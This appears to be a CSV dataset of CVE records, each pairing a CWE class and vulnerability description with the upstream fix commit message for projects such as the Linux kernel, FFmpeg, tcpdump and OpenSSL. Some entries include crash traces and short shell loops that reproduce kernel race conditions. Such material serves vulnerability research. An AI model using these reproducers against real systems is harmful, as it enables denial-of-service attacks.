CVE-2017-9990,CWE-119,2017-06-28,Stack-based buffer overflow in the color_string_to_rgba function in libavcodec/xpmdec.c in FFmpeg 3.3 before 3.3.1 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a crafted file.,Most of these were found through code review in response to fixing 1466/clusterfuzz-testcase-minimized-5961584419536896 There is thus no testcase for most of this. The initial issue was Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/targets/ffmpeg  Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2016-8655,CWE-362,2016-12-08,"Race condition in net/packet/af_packet.c in the Linux kernel through 4.8.12 allows local users to gain privileges or cause a denial of service (use-after-free) by leveraging the CAP_NET_RAW capability to change a socket version, related to the packet_set_ring and packet_setsockopt functions.","When packet_set_ring creates a ring buffer it will initialize a struct timer_list if the packet version is TPACKET_V3. This value can then be raced by a different thread calling setsockopt to set the version to TPACKET_V1 before packet_set_ring has finished.  This leads to a use-after-free on a function pointer in the struct timer_list when the socket is closed as the previously initialized timer will not be deleted.  The bug is fixed by taking lock_sock(sk) in packet_setsockopt when changing the packet version while also taking the lock at the start of packet_set_ring.  Fixes: f6fb8f1 (""af-packet: TPACKET_V3 flexible buffer implementation."") Signed-off-by: Philip Pettersson <philip.pettersson@gmail.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2019-12209,CWE-59,2019-06-04,"Yubico pam-u2f 1.0.7 attempts parsing of the configured authfile (default $HOME/.config/Yubico/u2f_keys) as root (unless openasuser was enabled), and does not properly verify that the path lacks symlinks pointing to other files on the system owned by root. If the debug option is enabled in the PAM configuration, part of the file contents of a symlink target will be logged, possibly revealing sensitive information.",The module is typically executed as root and would sometimes open files or follow symlinks that could be controlled from the outside.  Drop privileges to the target user before opening any files.  Fixes CVE-2019-12209.  Thanks to Matthias Gerstner of the SUSE Security Team for reporting the issue.
CVE-2014-2038,CWE-200,2014-02-28,"The nfs_can_extend_write function in fs/nfs/write.c in the Linux kernel before 3.13.3 relies on a write delegation to extend a write operation without a certain up-to-date verification, which allows local users to obtain sensitive information from kernel memory in opportunistic circumstances by writing to a file in an NFS filesystem and then reading the same file.","We should always make sure the cached page is up-to-date when we're determining whether we can extend a write to cover the full page -- even if we've received a write delegation from the server.  Commit c755966 added logic to skip this check if we have a write delegation, which can lead to data corruption such as the following scenario if client B receives a write delegation from the NFS server:  Client A:     # echo 123456789 > /mnt/file  Client B:     # echo abcdefghi >> /mnt/file     # cat /mnt/file     0�D0�abcdefghi  Just because we hold a write delegation doesn't mean that we've read in the entire page contents.  Cc: <stable@vger.kernel.org> # v3.11+ Signed-off-by: Scott Mayhew <smayhew@redhat.com> Signed-off-by: Trond Myklebust <trond.myklebust@primarydata.com>"
CVE-2017-12895,CWE-125,2017-09-14,The ICMP parser in tcpdump before 4.9.2 has a buffer over-read in print-icmp.c:icmp_print().,This fixes a buffer over-read discovered by Forcepoint's security researchers Otto Airamo & Antti Levomäki.  Add tests using the capture files supplied by the reporter(s).
CVE-2015-8845,CWE-284,2016-04-27,"The tm_reclaim_thread function in arch/powerpc/kernel/process.c in the Linux kernel before 4.4.1 on powerpc platforms does not ensure that TM suspend mode exists before proceeding with a tm_reclaim call, which allows local users to cause a denial of service (TM Bad Thing exception and panic) via a crafted application.","Currently we can hit a scenario where we'll tm_reclaim() twice.  This results in a TM bad thing exception because the second reclaim occurs when not in suspend mode.  The scenario in which this can happen is the following.  We attempt to deliver a signal to userspace.  To do this we need obtain the stack pointer to write the signal context.  To get this stack pointer we must tm_reclaim() in case we need to use the checkpointed stack pointer (see get_tm_stackpointer()).  Normally we'd then return directly to userspace to deliver the signal without going through __switch_to().  Unfortunatley, if at this point we get an error (such as a bad userspace stack pointer), we need to exit the process.  The exit will result in a __switch_to().  __switch_to() will attempt to save the process state which results in another tm_reclaim().  This tm_reclaim() now causes a TM Bad Thing exception as this state has already been saved and the processor is no longer in TM suspend mode. Whee!  This patch checks the state of the MSR to ensure we are TM suspended before we attempt the tm_reclaim().  If we've already saved the state away, we should no longer be in TM suspend mode.  This has the additional advantage of checking for a potential TM Bad Thing exception.  Found using syscall fuzzer.  Fixes: fb09692 (""powerpc: Add reclaim and recheckpoint functions for context switching transactional memory processes"") Cc: stable@vger.kernel.org # v3.9+ Signed-off-by: Michael Neuling <mikey@neuling.org> Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>"
CVE-2018-1999010,CWE-125,2018-07-23,FFmpeg before commit cced03dd667a5df6df8fd40d8de0bff477ee02e8 contains multiple out of array access vulnerabilities in the mms protocol that can result in attackers accessing out of bound data. This attack appear to be exploitable via network connectivity. This vulnerability appears to have been fixed in cced03dd667a5df6df8fd40d8de0bff477ee02e8 and later.,Fixes: out of array read Fixes: mms-crash-01b6c5d85f9d9f40f4e879896103e9f5b222816a  Found-by: Paul Ch <paulcher@icloud.com> 1st hunk by Paul Ch <paulcher@icloud.com> Tested-by: Paul Ch <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2016-10069,CWE-20,2017-03-02,coders/mat.c in ImageMagick before 6.9.4-5 allows remote attackers to cause a denial of service (application crash) via a mat file with an invalid number of frames.,
CVE-2018-0739,CWE-674,2018-03-27,Constructed ASN.1 types with a recursive definition (such as can be found in PKCS7) could eventually exceed the stack given malicious input with excessive recursion. This could result in a Denial Of Service attack. There are no such structures used within SSL/TLS that come from untrusted sources so this is considered safe. Fixed in OpenSSL 1.1.0h (Affected 1.1.0-1.1.0g). Fixed in OpenSSL 1.0.2o (Affected 1.0.2b-1.0.2n).,
CVE-2015-5232,CWE-362,2017-06-07,Race conditions in opa-fm before 10.4.0.0.196 and opa-ff before 10.4.0.0.197.,
CVE-2017-13686,CWE-476,2017-08-24,"net/ipv4/route.c in the Linux kernel 4.13-rc1 through 4.13-rc6 is too late to check for a NULL fi field when RTM_F_FIB_MATCH is set, which allows local users to cause a denial of service (NULL pointer dereference) or possibly have unspecified other impact via crafted system calls. NOTE: this does not affect any stable release.","Syzkaller hit 'general protection fault in fib_dump_info' bug on commit 4.13-rc5..  Guilty file: net/ipv4/fib_semantics.c  kasan: GPF could be caused by NULL-ptr deref or user memory access general protection fault: 0000 [#1] SMP KASAN Modules linked in: CPU: 0 PID: 2808 Comm: syz-executor0 Not tainted 4.13.0-rc5 #1 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014 task: ffff880078562700 task.stack: ffff880078110000 RIP: 0010:fib_dump_info+0x388/0x1170 net/ipv4/fib_semantics.c:1314 RSP: 0018:ffff880078117010 EFLAGS: 00010206 RAX: dffffc0000000000 RBX: 00000000000000fe RCX: 0000000000000002 RDX: 0000000000000006 RSI: ffff880078117084 RDI: 0000000000000030 RBP: ffff880078117268 R08: 000000000000000c R09: ffff8800780d80c8 R10: 0000000058d629b4 R11: 0000000067fce681 R12: 0000000000000000 R13: ffff8800784bd540 R14: ffff8800780d80b5 R15: ffff8800780d80a4 FS:  00000000022fa940(0000) GS:ffff88007fc00000(0000) knlGS:0000000000000000 CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 CR2: 00000000004387d0 CR3: 0000000079135000 CR4: 00000000000006f0 Call Trace:   inet_rtm_getroute+0xc89/0x1f50 net/ipv4/route.c:2766   rtnetlink_rcv_msg+0x288/0x680 net/core/rtnetlink.c:4217   netlink_rcv_skb+0x340/0x470 net/netlink/af_netlink.c:2397   rtnetlink_rcv+0x28/0x30 net/core/rtnetlink.c:4223   netlink_unicast_kernel net/netlink/af_netlink.c:1265 [inline]   netlink_unicast+0x4c4/0x6e0 net/netlink/af_netlink.c:1291   netlink_sendmsg+0x8c4/0xca0 net/netlink/af_netlink.c:1854   sock_sendmsg_nosec net/socket.c:633 [inline]   sock_sendmsg+0xca/0x110 net/socket.c:643   ___sys_sendmsg+0x779/0x8d0 net/socket.c:2035   __sys_sendmsg+0xd1/0x170 net/socket.c:2069   SYSC_sendmsg net/socket.c:2080 [inline]   SyS_sendmsg+0x2d/0x50 net/socket.c:2076   entry_SYSCALL_64_fastpath+0x1a/0xa5   RIP: 0033:0x4512e9   RSP: 002b:00007ffc75584cc8 EFLAGS: 00000216 ORIG_RAX:   000000000000002e   RAX: ffffffffffffffda RBX: 0000000000000002 RCX: 00000000004512e9   RDX: 0000000000000000 RSI: 0000000020f2cfc8 RDI: 0000000000000003   RBP: 000000000000000e R08: 0000000000000000 R09: 0000000000000000   R10: 0000000000000000 R11: 0000000000000216 R12: fffffffffffffffe   R13: 0000000000718000 R14: 0000000020c44ff0 R15: 0000000000000000   Code: 00 0f b6 8d ec fd ff ff 48 8b 85 f0 fd ff ff 88 48 17 48 8b 45   28 48 8d 78 30 48 b8 00 00 00 00 00 fc ff df 48 89 fa 48 c1 ea 03   <0f>   b6 04 02 84 c0 74 08 3c 03 0f 8e cb 0c 00 00 48 8b 45 28 44   RIP: fib_dump_info+0x388/0x1170 net/ipv4/fib_semantics.c:1314 RSP:   ffff880078117010 ---[ end trace 254a7af28348f88b ]---  This patch adds a res->fi NULL check.  example run: $ip route get 0.0.0.0 iif virt1-0 broadcast 0.0.0.0 dev lo     cache <local,brd> iif virt1-0  $ip route get 0.0.0.0 iif virt1-0 fibmatch RTNETLINK answers: No route to host  Reported-by: idaifish <idaifish@gmail.com> Reported-by: Dmitry Vyukov <dvyukov@google.com> Fixes: b617981 (""net: ipv4: RTM_GETROUTE: return matched fib result when requested"") Signed-off-by: Roopa Prabhu <roopa@cumulusnetworks.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2011-2521,CWE-189,2012-05-24,"The x86_assign_hw_event function in arch/x86/kernel/cpu/perf_event.c in the Performance Events subsystem in the Linux kernel before 2.6.39 does not properly calculate counter values, which allows local users to cause a denial of service (panic) via the perf program.","The following patch solves the problems introduced by Robert's commit 41bf498 and reported by Arun Sharma. This commit gets rid of the base + index notation for reading and writing PMU msrs.  The problem is that for fixed counters, the new calculation for the base did not take into account the fixed counter indexes, thus all fixed counters were read/written from fixed counter 0. Although all fixed counters share the same config MSR, they each have their own counter register.  Without:   $ task -e unhalted_core_cycles -e instructions_retired -e baclears noploop 1 noploop for 1 seconds    242202299 unhalted_core_cycles (0.00% scaling, ena=1000790892, run=1000790892)  2389685946 instructions_retired (0.00% scaling, ena=1000790892, run=1000790892)       49473 baclears             (0.00% scaling, ena=1000790892, run=1000790892)  With:   $ task -e unhalted_core_cycles -e instructions_retired -e baclears noploop 1 noploop for 1 seconds   2392703238 unhalted_core_cycles (0.00% scaling, ena=1000840809, run=1000840809)  2389793744 instructions_retired (0.00% scaling, ena=1000840809, run=1000840809)       47863 baclears             (0.00% scaling, ena=1000840809, run=1000840809)  Signed-off-by: Stephane Eranian <eranian@google.com> Cc: peterz@infradead.org Cc: ming.m.lin@intel.com Cc: robert.richter@amd.com Cc: asharma@fb.com Cc: perfmon2-devel@lists.sf.net LKML-Reference: <20110319172005.GB4978@quad> Signed-off-by: Ingo Molnar <mingo@elte.hu>"
CVE-2014-3487,CWE-20,2014-07-09,"The cdf_read_property_info function in file before 5.19, as used in the Fileinfo component in PHP before 5.4.30 and 5.5.x before 5.5.14, does not properly validate a stream offset, which allows remote attackers to cause a denial of service (application crash) via a crafted CDF file.",
CVE-2013-1958,CWE-264,2013-04-24,"The scm_check_creds function in net/core/scm.c in the Linux kernel before 3.8.6 does not properly enforce capability requirements for controlling the PID value associated with a UNIX domain socket, which allows local users to bypass intended access restrictions by leveraging the time interval during which a user namespace has been created but a PID namespace has not been created.","Don't allow spoofing pids over unix domain sockets in the corner cases where a user has created a user namespace but has not yet created a pid namespace.  Cc: stable@vger.kernel.org Reported-by: Andy Lutomirski <luto@amacapital.net> Signed-off-by: ""Eric W. Biederman"" <ebiederm@xmission.com>"
CVE-2015-8617,CWE-134,2016-01-19,"Format string vulnerability in the zend_throw_or_error function in Zend/zend_execute_API.c in PHP 7.x before 7.0.1 allows remote attackers to execute arbitrary code via format string specifiers in a string that is misused as a class name, leading to incorrect error handling.",
CVE-2014-3645,CWE-20,2014-11-10,"arch/x86/kvm/vmx.c in the KVM subsystem in the Linux kernel before 3.12 does not have an exit handler for the INVEPT instruction, which allows guest OS users to cause a denial of service (guest OS crash) via a crafted application.","If we let L1 use EPT, we should probably also support the INVEPT instruction.  In our current nested EPT implementation, when L1 changes its EPT table for L2 (i.e., EPT12), L0 modifies the shadow EPT table (EPT02), and in the course of this modification already calls INVEPT. But if last level of shadow page is unsync not all L1's changes to EPT12 are intercepted, which means roots need to be synced when L1 calls INVEPT. Global INVEPT should not be different since roots are synced by kvm_mmu_load() each time EPTP02 changes.  Reviewed-by: Xiao Guangrong <xiaoguangrong@linux.vnet.ibm.com> Signed-off-by: Nadav Har'El <nyh@il.ibm.com> Signed-off-by: Jun Nakajima <jun.nakajima@intel.com> Signed-off-by: Xinhao Xu <xinhao.xu@intel.com> Signed-off-by: Yang Zhang <yang.z.zhang@Intel.com> Signed-off-by: Gleb Natapov <gleb@redhat.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2016-2188,,2016-05-02,The iowarrior_probe function in drivers/usb/misc/iowarrior.c in the Linux kernel before 4.5.1 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) via a crafted endpoints value in a USB device descriptor.,"The iowarrior driver expects at least one valid endpoint.  If given malicious descriptors that specify 0 for the number of endpoints, it will crash in the probe function.  Ensure there is at least one endpoint on the interface before using it.  The full report of this issue can be found here: http://seclists.org/bugtraq/2016/Mar/87  Reported-by: Ralf Spenneberg <ralf@spenneberg.net> Cc: stable <stable@vger.kernel.org> Signed-off-by: Josh Boyer <jwboyer@fedoraproject.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2014-3183,CWE-119,2014-09-28,Heap-based buffer overflow in the logi_dj_ll_raw_request function in drivers/hid/hid-logitech-dj.c in the Linux kernel before 3.16.2 allows physically proximate attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a crafted device that specifies a large report size for an LED report.,"The check on report size for REPORT_TYPE_LEDS in logi_dj_ll_raw_request() is wrong; the current check doesn't make any sense -- the report allocated by HID core in hid_hw_raw_request() can be much larger than DJREPORT_SHORT_LENGTH, and currently logi_dj_ll_raw_request() doesn't handle this properly at all.  Fix the check by actually trimming down the report size properly if it is too large.  Cc: stable@vger.kernel.org Reported-by: Ben Hawkes <hawkes@google.com> Reviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>"
CVE-2016-10066,CWE-120,2017-03-03,Buffer overflow in the ReadVIFFImage function in coders/viff.c in ImageMagick before 6.9.4-5 allows remote attackers to cause a denial of service (application crash) via a crafted file.,
CVE-2019-14980,CWE-416,2019-08-12,"In ImageMagick 7.x before 7.0.8-42 and 6.x before 6.9.10-42, there is a use after free vulnerability in the UnmapBlob function that allows an attacker to cause a denial of service by sending a crafted file.",
CVE-2016-8602,CWE-704,2017-04-14,The .sethalftone5 function in psi/zht2.c in Ghostscript before 9.21 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted Postscript document that calls .sethalftone5 with an empty operand stack.,
CVE-2012-3400,CWE-787,2012-10-03,Heap-based buffer overflow in the udf_load_logicalvol function in fs/udf/super.c in the Linux kernel before 3.4.5 allows remote attackers to cause a denial of service (system crash) or possibly have unspecified other impact via a crafted UDF filesystem.,Add sanity checks when loading sparing table from disk to avoid accessing unallocated memory or writing to it.  Signed-off-by: Jan Kara <jack@suse.cz>
CVE-2015-2304,CWE-22,2015-03-15,Absolute path traversal vulnerability in bsdcpio in libarchive 3.1.2 and earlier allows remote attackers to write to arbitrary files via a full pathname in an archive.,This fixes a directory traversal in the cpio tool.
CVE-2018-12436,CWE-200,2018-06-15,"wolfcrypt/src/ecc.c in wolfSSL before 3.15.1.patch allows a memory-cache side-channel attack on ECDSA signatures, aka the Return Of the Hidden Number Problem or ROHNP. To discover an ECDSA key, the attacker needs access to either the local machine or a different virtual machine on the same physical host.",
CVE-2015-5296,CWE-20,2015-12-29,"Samba 3.x and 4.x before 4.1.22, 4.2.x before 4.2.7, and 4.3.x before 4.3.3 supports connections that are encrypted but unsigned, which allows man-in-the-middle attackers to conduct encrypted-to-unencrypted downgrade attacks by modifying the client-server data stream, related to clidfs.c, libsmb_server.c, and smbXcli_base.c.",
CVE-2016-0797,,2016-03-03,"Multiple integer overflows in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allow remote attackers to cause a denial of service (heap memory corruption or NULL pointer dereference) or possibly have unspecified other impact via a long digit string that is mishandled by the (1) BN_dec2bn or (2) BN_hex2bn function, related to crypto/bn/bn.h and crypto/bn/bn_print.c.",
CVE-2018-7752,CWE-119,2018-03-07,"GPAC through 0.7.1 has a Buffer Overflow in the gf_media_avc_read_sps function in media_tools/av_parsers.c, a different vulnerability than CVE-2018-1000100.",
CVE-2015-0292,CWE-119,2015-03-19,"Integer underflow in the EVP_DecodeUpdate function in crypto/evp/encode.c in the base64-decoding implementation in OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via crafted base64 data that triggers a buffer overflow.",
CVE-2016-9566,CWE-59,2016-12-15,base/logging.c in Nagios Core before 4.2.4 allows local users with access to an account in the nagios group to gain root privileges via a symlink attack on the log file.  NOTE: this can be leveraged by remote attackers using CVE-2016-9565.,
CVE-2014-2013,CWE-119,2014-03-03,Stack-based buffer overflow in the xps_parse_color function in xps/xps-common.c in MuPDF 1.3 and earlier allows remote attackers to execute arbitrary code via a large number of entries in the ContextColor value of the Fill attribute in a Path element.,
CVE-2017-5669,,2017-02-24,"The do_shmat function in ipc/shm.c in the Linux kernel through 4.9.12 does not restrict the address calculated by a certain rounding operation, which allows local users to map page zero, and consequently bypass a protection mechanism that exists for the mmap system call, by making crafted shmget and shmat system calls in a privileged context.","The issue is described here, with a nice testcase:      https://bugzilla.kernel.org/show_bug.cgi?id=192931  The problem is that shmat() calls do_mmap_pgoff() with MAP_FIXED, and the address rounded down to 0.  For the regular mmap case, the protection mentioned above is that the kernel gets to generate the address -- arch_get_unmapped_area() will always check for MAP_FIXED and return that address.  So by the time we do security_mmap_addr(0) things get funky for shmat().  The testcase itself shows that while a regular user crashes, root will not have a problem attaching a nil-page.  There are two possible fixes to this.  The first, and which this patch does, is to simply allow root to crash as well -- this is also regular mmap behavior, ie when hacking up the testcase and adding mmap(...  |MAP_FIXED).  While this approach is the safer option, the second alternative is to ignore SHM_RND if the rounded address is 0, thus only having MAP_SHARED flags.  This makes the behavior of shmat() identical to the mmap() case.  The downside of this is obviously user visible, but does make sense in that it maintains semantics after the round-down wrt 0 address and mmap.  Passes shm related ltp tests.  Link: http://lkml.kernel.org/r/1486050195-18629-1-git-send-email-dave@stgolabs.net Signed-off-by: Davidlohr Bueso <dbueso@suse.de> Reported-by: Gareth Evans <gareth.evans@contextis.co.uk> Cc: Manfred Spraul <manfred@colorfullife.com> Cc: Michael Kerrisk <mtk.manpages@googlemail.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2013-7026,CWE-362,2013-12-09,Multiple race conditions in ipc/shm.c in the Linux kernel before 3.12.2 allow local users to cause a denial of service (use-after-free and system crash) or possibly have unspecified other impact via a crafted application that uses shmctl IPC_RMID operations in conjunction with other shm system calls.,"When IPC_RMID races with other shm operations there's potential for use-after-free of the shm object's associated file (shm_file).  Here's the race before this patch:    TASK 1                     TASK 2   ------                     ------   shm_rmid()     ipc_lock_object()                              shmctl()                              shp = shm_obtain_object_check()      shm_destroy()       shum_unlock()       fput(shp->shm_file)                              ipc_lock_object()                              shmem_lock(shp->shm_file)                              <OOPS>  The oops is caused because shm_destroy() calls fput() after dropping the ipc_lock.  fput() clears the file's f_inode, f_path.dentry, and f_path.mnt, which causes various NULL pointer references in task 2.  I reliably see the oops in task 2 if with shmlock, shmu  This patch fixes the races by: 1) set shm_file=NULL in shm_destroy() while holding ipc_object_lock(). 2) modify at risk operations to check shm_file while holding    ipc_object_lock().  Example workloads, which each trigger oops...  Workload 1:   while true; do     id=$(shmget 1 4096)     shm_rmid $id &     shmlock $id &     wait   done    The oops stack shows accessing NULL f_inode due to racing fput:     _raw_spin_lock     shmem_lock     SyS_shmctl  Workload 2:   while true; do     id=$(shmget 1 4096)     shmat $id 4096 &     shm_rmid $id &     wait   done    The oops stack is similar to workload 1 due to NULL f_inode:     touch_atime     shmem_mmap     shm_mmap     mmap_region     do_mmap_pgoff     do_shmat     SyS_shmat  Workload 3:   while true; do     id=$(shmget 1 4096)     shmlock $id     shm_rmid $id &     shmunlock $id &     wait   done    The oops stack shows second fput tripping on an NULL f_inode.  The   first fput() completed via from shm_destroy(), but a racing thread did   a get_file() and queued this fput():     locks_remove_flock     __fput     ____fput     task_work_run     do_notify_resume     int_signal  Fixes: c2c737a (""ipc,shm: shorten critical region for shmat"") Fixes: 2caacaa (""ipc,shm: shorten critical region for shmctl"") Signed-off-by: Greg Thelen <gthelen@google.com> Cc: Davidlohr Bueso <davidlohr@hp.com> Cc: Rik van Riel <riel@redhat.com> Cc: Manfred Spraul <manfred@colorfullife.com> Cc: <stable@vger.kernel.org>  # 3.10.17+ 3.11.6+ Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2011-4604,CWE-119,2013-06-07,The bat_socket_read function in net/batman-adv/icmp_socket.c in the Linux kernel before 3.3 allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a crafted batman-adv ICMP packet.,Don't write more than the requested number of bytes of an batman-adv icmp packet to the userspace buffer. Otherwise unrelated userspace memory might get overridden by the kernel.  Signed-off-by: Sven Eckelmann <sven@narfation.org> Signed-off-by: Marek Lindner <lindner_marek@yahoo.de>
CVE-2017-6429,CWE-119,2017-03-15,Buffer overflow in the tcpcapinfo utility in Tcpreplay before 4.2.0 Beta 1 allows remote attackers to have unspecified impact via a pcap file with an over-size packet.,* #278 fail if capture has a packet that is too large  * Update CHANGELOG
CVE-2017-16534,CWE-119,2017-11-04,The cdc_parse_cdc_header function in drivers/usb/core/message.c in the Linux kernel before 4.13.6 allows local users to cause a denial of service (out-of-bounds read and system crash) or possibly have unspecified other impact via a crafted USB device.,"Andrey Konovalov reported a possible out-of-bounds problem for the cdc_parse_cdc_header function.  He writes: 	It looks like cdc_parse_cdc_header() doesn't validate buflen 	before accessing buffer[1], buffer[2] and so on. The only check 	present is while (buflen > 0).  So fix this issue up by properly validating the buffer length matches what the descriptor says it is.  Reported-by: Andrey Konovalov <andreyknvl@google.com> Tested-by: Andrey Konovalov <andreyknvl@google.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2016-0758,,2016-06-27,Integer overflow in lib/asn1_decoder.c in the Linux kernel before 4.6 allows local users to gain privileges via crafted ASN.1 data.,"This fixes CVE-2016-0758.  In the ASN.1 decoder, when the length field of an ASN.1 value is extracted, it isn't validated against the remaining amount of data before being added to the cursor.  With a sufficiently large size indicated, the check:  	datalen - dp < 2  may then fail due to integer overflow.  Fix this by checking the length indicated against the amount of remaining data in both places a definite length is determined.  Whilst we're at it, make the following changes:   (1) Check the maximum size of extended length does not exceed the capacity      of the variable it's being stored in (len) rather than the type that      variable is assumed to be (size_t).   (2) Compare the EOC tag to the symbolic constant ASN1_EOC rather than the      integer 0.   (3) To reduce confusion, move the initialisation of len outside of:  	for (len = 0; n > 0; n--) {       since it doesn't have anything to do with the loop counter n.  Signed-off-by: David Howells <dhowells@redhat.com> Reviewed-by: Mimi Zohar <zohar@linux.vnet.ibm.com> Acked-by: David Woodhouse <David.Woodhouse@intel.com> Acked-by: Peter Jones <pjones@redhat.com>"
CVE-2019-12107,CWE-252,2019-05-15,The upnp_event_prepare function in upnpevents.c in MiniUPnP MiniUPnPd through 2.1 allows a remote attacker to leak information from the heap due to improper validation of an snprintf return value.,
CVE-2017-13049,CWE-125,2017-09-14,The Rx protocol parser in tcpdump before 4.9.2 has a buffer over-read in print-rx.c:ubik_print().,One of the case blocks in ubik_print() didn't check bounds before fetching 32 bits of packet data and could overread past the captured packet data by that amount.  This fixes a buffer over-read discovered by Henri Salo from Nixu Corporation.  Add a test using the capture file supplied by the reporter(s).
CVE-2017-9798,CWE-416,2017-09-18,"Apache httpd allows remote attackers to read secret data from process memory if the Limit directive can be set in a user's .htaccess file, or if httpd.conf has certain misconfigurations, aka Optionsbleed. This affects the Apache HTTP Server through 2.2.34 and 2.4.x through 2.4.27. The attacker sends an unauthenticated OPTIONS HTTP request when attempting to read secret data. This is a use-after-free issue and thus secret data is not always sent, and the specific data depends on many factors including configuration. Exploitation with .htaccess can be blocked with a patch to the ap_limit_section function in server/core.c.",used only if registered at init time (httpd.conf).  Calling ap_method_register() in children processes is not the right scope since it won't be shared for all requests.   git-svn-id: https://svn.apache.org/repos/asf/httpd/httpd/trunk@1807655 13f79535-47bb-0310-9956-ffa450edef68
CVE-2017-13010,CWE-125,2017-09-14,The BEEP parser in tcpdump before 4.9.2 has a buffer over-read in print-beep.c:l_strnstart().,This fixes a buffer over-read discovered by Brian 'geeknik' Carpenter.  Add a test using the capture file supplied by the reporter(s).
CVE-2015-2150,CWE-264,2015-03-12,"Xen 3.3.x through 4.5.x and the Linux kernel through 3.19.1 do not properly restrict access to PCI command registers, which might allow local guest OS users to cause a denial of service (non-maskable interrupt and host crash) by disabling the (1) memory or (2) I/O decoding for a PCI Express device and then accessing the device, which triggers an Unsupported Request (UR) response.","Otherwise the guest can abuse that control to cause e.g. PCIe Unsupported Request responses by disabling memory and/or I/O decoding and subsequently causing (CPU side) accesses to the respective address ranges, which (depending on system configuration) may be fatal to the host.  Note that to alter any of the bits collected together as PCI_COMMAND_GUEST permissive mode is now required to be enabled globally or on the specific device.  This is CVE-2015-2150 / XSA-120.  Signed-off-by: Jan Beulich <jbeulich@suse.com> Reviewed-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com> Cc: <stable@vger.kernel.org> Signed-off-by: David Vrabel <david.vrabel@citrix.com>"
CVE-2010-0011,CWE-264,2010-02-25,"The eval_js function in uzbl-core.c in Uzbl before 2010.01.05 exposes the run method of the Uzbl object, which allows remote attackers to execute arbitrary commands via JavaScript code.",
CVE-2016-4565,CWE-264,2016-05-23,"The InfiniBand (aka IB) stack in the Linux kernel before 4.5.3 incorrectly relies on the write system call, which allows local users to cause a denial of service (kernel memory write operation) or possibly have unspecified other impact via a uAPI interface.","The drivers/infiniband stack uses write() as a replacement for bi-directional ioctl().  This is not safe. There are ways to trigger write calls that result in the return structure that is normally written to user space being shunted off to user specified kernel memory instead.  For the immediate repair, detect and deny suspicious accesses to the write API.  For long term, update the user space libraries and the kernel API to something that doesn't present the same security vulnerabilities (likely a structured ioctl() interface).  The impacted uAPI interfaces are generally only available if hardware from drivers/infiniband is installed in the system.  Reported-by: Jann Horn <jann@thejh.net> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Jason Gunthorpe <jgunthorpe@obsidianresearch.com> [ Expanded check to all known write() entry points ] Cc: stable@vger.kernel.org Signed-off-by: Doug Ledford <dledford@redhat.com>"
CVE-2018-14466,CWE-125,2019-10-03,The Rx parser in tcpdump before 4.9.3 has a buffer over-read in print-rx.c:rx_cache_find() and rx_cache_insert().,"In rx_cache_insert() and rx_cache_find() properly read the serviceId field of the rx_header structure as a 16-bit integer. When those functions tried to read 32 bits the extra 16 bits could be outside of the bounds checked in rx_print() for the rx_header structure, as serviceId is the last field in that structure.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s)."
CVE-2015-8104,CWE-399,2015-11-16,"The KVM subsystem in the Linux kernel through 4.2.6, and Xen 4.3.x through 4.6.x, allows guest OS users to cause a denial of service (host OS panic or hang) by triggering many #DB (aka Debug) exceptions, related to svm.c.","This is needed to avoid the possibility that the guest triggers an infinite stream of #DB exceptions (CVE-2015-8104).  VMX is not affected: because it does not save DR6 in the VMCS, it already intercepts #DB unconditionally.  Reported-by: Jan Beulich <jbeulich@suse.com> Cc: stable@vger.kernel.org Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2016-10050,CWE-119,2017-03-23,Heap-based buffer overflow in the ReadRLEImage function in coders/rle.c in ImageMagick 6.9.4-8 allows remote attackers to cause a denial of service (application crash) or have other unspecified impact via a crafted RLE file.,
CVE-2018-12714,CWE-787,2018-06-24,"An issue was discovered in the Linux kernel through 4.17.2. The filter parsing in kernel/trace/trace_events_filter.c could be called with no filter, which is an N=0 case when it expected at least one line to have been read, thus making the N-1 index invalid. This allows attackers to cause a denial of service (slab out-of-bounds write) or possibly have unspecified other impact via crafted perf_event_open and mmap system calls.","Pull tracing fixes from Steven Rostedt:  ""This contains a few fixes and a clean up.     - a bad merge caused an ""endif"" to go in the wrong place in      scripts/Makefile.build     - softirq tracing fix for tracing that corrupts lockdep and causes a      false splat     - histogram documentation typo fixes     - fix a bad memory reference when passing in no filter to the filter      code     - simplify code by using the swap macro instead of open coding the      swap""  * tag 'trace-v4.18-rc1' of git://git.kernel.org/pub/scm/linux/kernel/git/rostedt/linux-trace:   tracing: Fix SKIP_STACK_VALIDATION=1 build due to bad merge with -mrecord-mcount   tracing: Fix some errors in histogram documentation   tracing: Use swap macro in update_max_tr   softirq: Reorder trace_softirqs_on to prevent 